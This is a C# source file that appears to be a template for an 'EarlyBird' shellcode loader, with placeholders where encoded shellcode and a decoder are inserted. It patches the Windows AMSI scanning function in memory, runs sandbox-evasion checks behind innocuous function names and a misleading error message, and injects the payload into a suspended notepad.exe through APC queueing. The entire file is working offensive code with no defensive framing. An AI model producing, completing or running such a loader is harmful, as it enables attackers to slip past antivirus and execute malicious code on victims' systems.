using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;


namespace EarlyBird
{
    internal class Program
    {
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;
        private static UInt32 CREATE_SUSPENDED = 0x00000004;

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void cleaning()
        {
            // all credits to https://rastamouse.me/memory-patching-amsi-bypass/
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName == "amsi.dll")
                {
                    hAmsi = module.BaseAddress;
                    Console.WriteLine("Found isma");
                    break;
                }
            }
            if (hAmsi == IntPtr.Zero)
            {
                return;
            }
            else
            {
                var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                var garbage = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

                VirtualProtect(asb, (UIntPtr)garbage.Length, 0x40, out uint oldProtect);

                Marshal.Copy(garbage, 0, asb, garbage.Length);

                VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);

                Console.WriteLine("Patched");
            }
        }

        static void enhance(byte[] buf, string host)
        {
            // thanks to https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            SECURITY_ATTRIBUTES lpSecurityAttributes = new SECURITY_ATTRIBUTES();

            bool result = CreateProcess(null, host, ref lpSecurityAttributes, ref lpSecurityAttributes, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            if (result)
            {
                Console.WriteLine("Process created with PID: {0}", pi.dwProcessId);
            }
            else
            {
                Console.WriteLine("There was a problem creating the process.");
                System.Environment.Exit(1);
            }

            IntPtr tProcess = pi.hProcess;
            IntPtr tHandle = pi.hThread;

            IntPtr resultPtr = VirtualAllocEx(tProcess, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(tProcess, resultPtr, buf, buf.Length, out bytesWritten);
            VirtualProtectEx(tProcess, resultPtr, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out _);
            QueueUserAPC(resultPtr, tHandle, IntPtr.Zero);
            ResumeThread(tHandle);

        }

        static bool buy_in()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }

            return true;
        }

        static void Main(string[] args)
        {
            string host = "C:\\Windows\\System32\\notepad.exe";

            !!!_SHELLCODE_MARK!!!

            bool result = buy_in();
            if (!result)
            {
                Console.WriteLine("Architecture is not compatible");
                System.Environment.Exit(1);
            }

            cleaning();

            !!!DECODE_ROUTINE!!!

            enhance(buf, host);
        }
    }
}

